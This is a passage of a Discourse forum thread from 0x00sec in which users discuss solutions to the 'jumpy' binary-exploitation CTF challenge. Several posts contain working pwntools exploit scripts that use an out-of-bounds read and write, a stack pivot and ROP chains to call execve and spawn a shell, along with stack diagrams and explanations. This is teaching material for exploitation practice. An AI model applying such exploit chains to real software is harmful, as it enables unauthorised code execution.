                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T20:02:18Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>Uhm, as we all know, this task, require a bit of ROP knowledge, so you basically can build a good rop-chain; i‚Äôve already written a simple article, so you can start learning ROP stuff‚Ä¶<br>
<a href="../../../external.html?link=https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937">ROP article</a><br>
Hope it helps a bit! <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:">
</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T20:25:18Z' class='post-time'>
                    August 13, 2017,  8:25pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-14T08:49:04Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>From top to bottom (my opinion):</p>
<ul>
<li>Computer Architecture</li>
<li>C</li>
<li>Memory Organization</li>
<li>Assembly</li>
<li>Reverse Engineering</li>
<li>Binary Exploitation</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T20:29:48Z' class='post-time'>
                    August 13, 2017,  8:29pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T20:29:48Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I was expecting a much simpler solution from you <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"> <span class="spoiler">I‚Äôm surprised you didn‚Äôt use the add esp, 0x2c gadget to pivot to the array buffer you controlled.</span></p>
<p>Here‚Äôs my(intended) PoC:</p>
<div class="spoiler">
<pre><code class="lang-python">from pwn import *

def enter_name(name):

	p.recvuntil('name: ')

	p.sendline(name)
	return 

def store(idx, val):

	p.recvuntil('&gt; ')

	p.sendline('2')

	p.recvuntil('Index: ')
	p.sendline(str(idx))

	p.recvuntil('Value: ')
	p.sendline(str(val))

	return

def read_value(idx):

	p.recvuntil('&gt; ')

	p.sendline('1')
	p.sendline(str(idx))

	p.recvuntil('= ')
	value = p.recvline().replace('\n', "")

	return value

def pwn():

	enter_name('/bin/sh')
	# Leak array's address
	array = read_value(-8)
	# buffer where we enter the name, aka /bin/sh is at esp + 0x422
	# buffer where we enter the integers is at esp + 0x20
	# 0x422 - 0x20 = 1026
	name  = int(array, 16) + 1026

	log.success("Array: {}".format(str(array)))
	log.success("sh:    {}".format(str(hex(name))))

    # 0x080bb626: pop eax; ret;  	
	store(3, 134985254)
	store(4, 0xb)
    # 0x0806f0b0: pop edx; pop ecx; pop ebx; ret; 	
	store(5, 134672560)
	store(6, 0)
	store(7, 0)
	store(8, name)
    # 0x0806f750: int 0x80; ret; 					
	store(9, 134674256)								
	# -9th is the return address of store()'s 		
	# Stack pivot									
    # 0x08049a27: add esp, 0x2c; ret; 				
	store(-9, 134519335) 
	p.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) &gt; 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process('./jumpy')
        pause()
        pwn()

</code></pre>
</div>
<div class="spoiler">
<p>‚ûú  pwn python jumpy.py<br>
[<em>] For remote: jumpy.py HOST PORT<br>
[+] Starting local process ‚Äò./jumpy‚Äô: pid 24313<br>
[</em>] Paused (press any to continue)<br>
[*] Switching to interactive mode<br>
$ whoami<br>
vagrant</p>
</div>
<p>Congrats either way! <img src="../../../0x00sec.org/images/emoji/twitter/musclec164.html?v=9" title=":muscle:" class="emoji" alt=":muscle:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-13T20:34:27Z' class='post-time'>
                    August 13, 2017,  8:34pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-13T20:34:52Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>[spoiler]- Oh my god, i didn‚Äôt use the outofbound read <img src="../../../0x00sec.org/images/emoji/twitter/frowningc164.html?v=9" title=":frowning:" class="emoji" alt=":frowning:">!</p>
<ul>
<li>Sorry, that was a big mistake, it was the problem ; -;‚Ä¶</li>
<li>I builded the whole chain to find and calculate name address :‚Äô([/spoiler]</li>
</ul>
<p>That was a fail‚Ä¶ xddd</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_11' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/neolex.html'><span itemprop='name'>neolex</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-15T02:28:27Z' class='post-time'>
                    August 15, 2017,  2:28am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-15T02:28:27Z'>
              <span itemprop='position'>11</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I really tried this challenge but I didn‚Äôt manage to send the string to execve to spawn a shell <img src="../../../0x00sec.org/images/emoji/twitter/confusedc164.html?v=9" title=":confused:" class="emoji" alt=":confused:"><br>
And I don‚Äôt really understand your POCs ‚Ä¶</p>
<p><span class="spoiler"><br>
In <a class="mention" href="../../u/exploit.html">@exploit</a>‚Äôs POC  i don‚Äôt understand how the /bin/dash is passed to execve and I don‚Äôt know what is the 0x426 ‚Ä¶</span></p>
<p><span class="spoiler"><br>
In <a class="mention" href="../../u/_py.html">@_py</a>‚Äôs POC  The pivot in -9 have for purpose to ret to the the store(3‚Ä¶) ? why 3 ?</span></p>
<p>Sorry <img src="../../../0x00sec.org/images/emoji/twitter/confoundedc164.html?v=9" title=":confounded:" class="emoji" alt=":confounded:"><br>
Thanks for the challenge <a class="mention" href="../../u/_py.html">@_py</a> !</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_12' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/_py.html'><span itemprop='name'>_py</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-15T09:12:40Z' class='post-time'>
                    August 15, 2017,  9:12am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-15T09:19:59Z'>
              <span itemprop='position'>12</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hi <a class="mention" href="../../u/neolex.html">@neolex</a>,  so:</p>
<div class="spoiler">
<p>The purpose of the challenge was to teach you the concept of stack pivoting. Unfortunately no one solved it the intended way, so they practically learnt nothing new. As for my PoC now (which was the intended way):</p>
<p>The binary has an out-of-bound read (both positive and negative indices) and a partial out-of-bound-write (negative indices). At offset -9 from the integer array (meaning - 9*4 bytes since we are on a 32-bit arch) is the return address of any function you call inside main(). What do I mean by that? Let‚Äôs say store() is being called.</p>
<pre><code class="lang-makefile">                           Stack
                     +----------------+
 Stack grows         |       ...      |  &lt;--- main's frame
 towards low         |   uint* array  |
 addresses           +----------------+
                     |       ...      |  &lt;---- store's frame
                     +----------------+
</code></pre>
<p>Store() receives a <strong>stack pointer</strong> as an argument, the integer array to be precise. It‚Äôs really important to note the stack pointer part. Why? Well, since we have an OOB read and a partial OOB write, we can affect stack values below and above the integer array. And as we all know, what‚Äôs definitely stored on the stack? The return address!</p>
<p>The way to find the exact offset where the return address of store() is can be done either by trial and error (kinda skid-ish) or by looking at the assembly.</p>
<p>Main:</p>
<pre><code class="lang-auto">0804904b  lea     eax, [esp+0x20] /* uint array[] */
0804904f  mov     dword [esp], eax
08049052  call    store_value
</code></pre>
<p>So the array is at offset +0x20 (32 in decimal) from the stack pointer. Here‚Äôs the stack view right when store() is called:</p>
<pre><code class="lang-makefile">                     +--------------+
                     |      ...     |
   esp + 0x20 ---&gt;   |  uint* array |  
                     |      ...     |
                     +--------------+  
     old  esp ---&gt;   |  uint* array |   &lt;--- mov dword [esp], eax
                     +--------------+
                     |   ret addr   |   &lt;--- call store_value
     new  esp ---&gt;   +--------------+


</code></pre>
<p>I think it‚Äôs crystal clear now as to what‚Äôs going on with the stack and why at offset -36 you can overwrite the return address.</p>
<p>As for the stack pivot trick now, I overwrote the return address with the gadget <strong>add esp, 0x2c</strong> (could have used a different gadget for pivot ofc) which means the stack pointer will point 0x2c (44 decimal) above (higher address) from where it was pointing to.</p>
<p>Keep in mind, once store() is about to return, esp is pointing to where <em>old esp</em> was pointing to on the above ascii-art. Which means, the array buffer and esp will have 0x20 bytes difference. In other words, at offset <strong>esp + 0x20</strong> we can reach the <strong>1st</strong> array value (0th index). But, since we are adding 0x2c to esp (0x20 + 12) we can reach the <strong>4th</strong> array value (3rd index). That‚Äôs why I stored the gadgets from the 3rd index and up.</p>
<p>I hope it makes more sense now.</p>
</div>
<p>As for the /bin/sh string, just read my explanation above a couple of times and the comments in my exploit.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_13' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-15T11:11:21Z' class='post-time'>
                    August 15, 2017, 11:11am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-15T11:11:21Z'>
              <span itemprop='position'>13</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>
<a class="mention" href="../../u/neolex.html">@neolex</a> Regarding my exploit, here‚Äôs an explanation of the whole chain! <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:">
</li>
</ul>
<div class="spoiler">
<pre><code class="lang-python">chain = [pop_pop_ret,
	 0,
	 0,
	 mov_eax_edx,
	 pop_edx,
	 0x426,
	 add_eax_edx,
	 pop_pop_ret,
	 0,
	 0,
	 xchg_eax_edx,
	 mov_ebx_edx,
	 pop_eax,
	 0,
	 mov_ecx_eax,
	 pop_eax,
	 11,
	 pop_edx,
	 0,
	 int_0x80]
</code></pre>
<ul>
<li>
<p>So, in the first pop_pop_ret, it just prepares a good environ, so i can ROP peacefully‚Ä¶</p>
</li>
<li>
<p>$edx value is then passed to the $eax register‚Ä¶</p>
</li>
<li>
<p>I set $edx value to the offset of $name_address from $eax ( 0x426 )‚Ä¶ So i can get /bin/dash which was passed as a name previously‚Ä¶</p>
</li>
<li>
<p>I used the <strong>add eax, edx;</strong> gadget to add the value of $edx to $eax and $eax will then contain the address of name!</p>
</li>
<li>
<p>pop_pop_ret, again‚Ä¶</p>
</li>
<li>
<p>Now, since there werent much gadgets available to copy to $ebx register, i found one weird gadget, <strong>mov ebx, edx;</strong>. You better see the gadget yourself, it‚Äôs made of some case jumps etc, but they didn‚Äôt infect my ROP chain, so i used it! But before, i had to get the value of $eax into $edx register, no mov gadgets allowed us to do so, so i used <strong>xchg eax, edx;</strong>!</p>
</li>
<li>
<p>Then i used the <strong>mov ebx, edx;</strong> so /bin/dash address will be passed in the $ebx register!</p>
</li>
<li>
<p>Now that i got $ebx = $name_address, i had to set $ecx, $edx set to 0, and $eax set to execve() syscall number!</p>
</li>
<li>
<p>So i wasted some time looking for gadgets to zero-out $ecx. I found <strong>mov ecx, eax;</strong>. I then called <strong>pop eax;</strong> and set it‚Äôs value to 0, then moved it to $ecx, resulting in $ecx = 0!</p>
</li>
<li>
<p>After doing that, I used <strong>pop eax;</strong> again and placed the execve() syscall number there ( 11 ) !</p>
</li>
<li>
<p>And then i finally set $edx register‚Äôs value to 0, and called <strong>int 0x80;</strong> gadget, resulting in a shell being popped‚Ä¶</p>
</li>
</ul>
</div>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_14' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/neolex.html'><span itemprop='name'>neolex</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-15T11:24:29Z' class='post-time'>
                    August 15, 2017, 11:24am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-15T11:24:29Z'>
              <span itemprop='position'>14</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you both for your explanation !<br>
I learn a lot from you guys !<br>
I‚Äôll re-read it later to make sure i get it <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Thank‚Äôs again !</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_15' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/neolex.html'><span itemprop='name'>neolex</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-22T07:59:36Z' class='post-time'>
                    August 22, 2017,  7:59am
                  </time>
                  <meta itemprop='dateModified' content='2017-08-22T07:59:36Z'>
              <span itemprop='position'>15</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hi !<br>
I finally made the challenge to try this myself.</p>
<div class="spoiler">
<p>I wanted to try the pivot</p>
<pre><code>p = process("./jumpy")
p.recvuntil(":")
p.sendline("/bin/bash")

def read(index):
    p.recvuntil("&gt;")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(index))
    p.recvuntil("= ")
    return int(p.recvline(),16)


def store(index,value):
    p.recvuntil("&gt;")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(index))
    p.recvuntil(":")
    p.sendline(str(value))


# leak the bin/bash string
array = read(-8)
binbash = array + 1026  
print("/bin/bash: "+hex(binbash))


store(2,1094795585)#ebx = 0x41414141
store(3,134672522) #  pop edx ;; ret
store(4,0)
store(5,134672561) # pop ecx pop ebx ;ret
store(6,0)
store(7,binbash)
store(8,134564016) # xor eax,eax;ret
store(9,134832162) # add eax,0xb ; pop edi:ret
store(10,1094795585)#edi = 0x41414141
store(11,134518257) # int 0x80

store(-9,134563492)# add esp, 0x28 ; pop ebx ; ret
p.interactive()
</code></pre>
<p><a href="../../../external.html?link=https://asciinema.org/a/ngqYLvVeBVlAk9pDq16VAPusP" rel="nofollow noopener">https://asciinema.org/a/ngqYLvVeBVlAk9pDq16VAPusP</a></p>
</div>
<p>Thanks for the challenge <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="eR2Zay0gfuod1MAuyeH3sBXy3"></script>
  </body>
  
</html>
